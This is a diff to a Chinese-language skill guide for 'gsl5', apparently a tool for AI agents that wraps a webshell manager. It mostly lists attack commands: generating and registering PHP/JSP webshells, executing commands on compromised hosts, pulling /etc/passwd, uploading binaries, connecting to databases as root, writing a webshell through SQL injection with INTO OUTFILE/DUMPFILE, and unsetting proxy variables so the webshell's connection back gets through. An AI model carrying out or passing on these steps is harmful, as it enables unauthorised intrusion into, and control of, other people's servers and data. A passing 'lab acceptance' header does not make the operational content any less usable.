@@ -30,15 +30,29 @@ gsl5 [--task NAME] [--format json|text] [--timeout SEC] <command> [--flags]
 
 ```bash
 gsl5 --task T shell_list                      # 列 shell
-gsl5 --task T shell_add --url URL --password P --secretKey K --payload JavaDynamicPayload --cryption JAVA_AES_BASE64
 gsl5 --task T shell_info --shellId ID         # 探活+系统信息（encoding 自动探测写回）
 gsl5 --task T shell_exec --shellId ID --command 'id' [--encoding auto]
 gsl5 --task T file_download_local --shellId ID --remotePath /etc/passwd --out ./passwd   # 大文件直存本地
 gsl5 --task T file_upload_local --shellId ID --file ./tool.elf --remotePath /tmp/tool.elf
 gsl5 --task T db_connect --shellId ID --target '172.31.0.20 3306 root 123456 mysql' --configName C
 gsl5 --task T db_exec --shellId ID --sql 'select version();' --execType select
-gsl5 --task T shell_create --payload JavaDynamicPayload --cryption JAVA_AES_BASE64 --genFile ./shell.jsp
 ```
+
+### ⚠️ payload/cryption 必须与马的语言一致（写错即「有效载荷初始化失败」dead）
+
+| 马语言 | payload | 推荐 cryption | 生成示例 |
+|--------|---------|---------------|----------|
+| PHP | `PhpDynamicPayload` | `PHP_XOR_BASE64` | `shell_create --payload PhpDynamicPayload --cryption PHP_XOR_BASE64 --genFile ./shell.php` |
+| Java(JSP) | `JavaDynamicPayload` | `JAVA_AES_BASE64` | `shell_create --payload JavaDynamicPayload --cryption JAVA_AES_BASE64 --genFile ./shell.jsp` |
+| ASP/ASPX/C# | 对应 payload | 对应 cryption | `gsl5 payload_list` 实时查询 |
+
+```bash
+gsl5 --task T shell_add --url URL --password P --secretKey K --payload <按上表> --cryption <按上表>
+```
+
+- **注册报「有效载荷初始化失败」≠ 马已死**：90% 是 payload 选错。用 `shell_edit --shellId ID --payload <正确payload> --cryption <正确cryption>` 修正后 `shell_info` 复测，通常立即转 active。
+- **SQLi INTO OUTFILE 写马转义坑**：生成的马含 MySQL 会转义的字符（首写常见 `<?php\.@session_start` 解析错误）。用 `SELECT ... INTO OUTFILE ... FIELDS ESCAPED BY ''` 关闭转义，或 `SELECT FROM_BASE64('<base64马>') INTO DUMPFILE` 兜底。
+- **shell_edit 等子命令查参数用 `gsl5 tools shell_edit`，不要 `shell_edit --help`**。
 
 ## 长尾能力（不进 skill 正文）
 
@@ -54,6 +68,9 @@ gsl5 --task T shell_create --payload JavaDynamicPayload --cryption JAVA_AES_BASE
 3. **审计**：每条命令自动落账到 `<task>/logs/operation_audit.db`；多 agent 协作回溯靠它，禁止绕过。
 4. **task 卫生**：禁止把凭据写进 skill/文档；任务结束清理 task 目录并在任务记录留痕。
 5. **编码**：目标回显乱码时用 `--encoding auto`（自动探测写回 DB），勿盲目 GBK/UTF-8 硬试。
+6. **tasks-root 显式化**：始终显式 `--tasks-root`（或 `export GSL5_TASKS_ROOT=...`），省略时默认落 `$PWD/tasks`——CWD 不一致会导致 list/exec 看不到同一库，并产生游离 `tasks/` 目录。
+7. **代理变量净化**：环境预置的 `http_proxy/https_proxy` 会拦截回连——调用前加 `env -u HTTP_PROXY -u HTTPS_PROXY -u http_proxy -u https_proxy`（或 `NO_PROXY='*'`）。
+8. **suo5 限制**：PHP-Nginx 目标仅支持半双工（`--mode half`），属协议限制非 bug。
 
 ## 实验室验收
 
